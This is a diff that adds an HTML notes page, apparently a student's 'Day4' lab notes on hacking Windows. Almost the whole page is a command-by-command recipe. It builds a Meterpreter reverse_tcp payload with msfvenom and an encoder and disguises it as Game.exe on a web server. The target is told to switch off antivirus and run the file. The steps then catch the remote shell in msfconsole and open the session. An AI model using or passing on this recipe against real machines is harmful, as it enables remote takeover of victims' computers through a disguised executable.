@@ -1,0 +1,16 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Day4</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+  
+    <script type="text/javascript">
+        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
+        if (!in_frame()) {
+            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
+            window.location = 'index.html#' + page;
+        }
+    </script>
+</head>
+<body><div class="page"><h1 class="title">Day4</h1><br/><strong>Terms</strong><br />    Group Policy<br />    <a href="https://www.youtube.com/watch?v=Kojaz0uFIKk&list=PL2U8BLk0YRjAzuDrrg02nG0aQeaQt47ij&index=8&t=0s">https://www.youtube.com/watch?v=Kojaz0uFIKk&amp;list=PL2U8BLk0YRjAzuDrrg02nG0aQeaQt47ij&amp;index=8&amp;t=0s</a><br />    <br /><strong>Objective</strong><br />    Hacking Windows<br />        # <strong>Create a webserver</strong><br />                Use <strong><span style="background-color:#cecece;">systemctl start apache2</span></strong>   //to start a web server<br />                 <br />        # <strong>Create a malicious payload with venom</strong><br />                Navigate to /var/www/html and create a folder COD(say).<br />                Now inside COD use <br />                <span style="background-color:#cecece;">msfvenom -p windows/meterpreter/reverse_tcp --platform windows-a x86 -e x86/shikata_ga_nai -b “\x00”  LHOST=&lt;KaliIP&gt; -f exe &gt; /var/www/html/COD/Game.exe</span><br />                msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai -f exe LHOST=192.168.43.50 LPORT=4444 &gt; /var/www/html/COD/game.exe<br /><br />        # <strong>Let the target download the payload</strong><br />        Before downloading switch off the windows defender or any other antivirus.<br />        <img src="images/9-1.png" alt="images/9-1.png" /><br />        <br />        # <strong>Wait with a meterpreter session</strong><br />            Open msfconsole on kali<br />            &gt; use multi/handler<br />            &gt; set payload windows/meterpreter/reverse_tcp<br />            &gt; show options<br />            &gt; set LHOST &lt;kaliIP&gt;<br />            &gt;exploit -j -z<br />            <br />        # <strong>Let victim execute the stuff</strong><br />            <img src="images/9-2.png" alt="images/9-2.png" /><br />            <br />         # And we'll get the shell<br />               <img src="images/9-3.png" alt="images/9-3.png" /><br />               <br />           &gt;sessions <br />           <img src="images/9-4.png" alt="images/9-4.png" />    <br />           <br />           &gt;sessions -i &lt;ID&gt;<br />           <img src="images/9-5.png" alt="images/9-5.png" /></div></body></html>
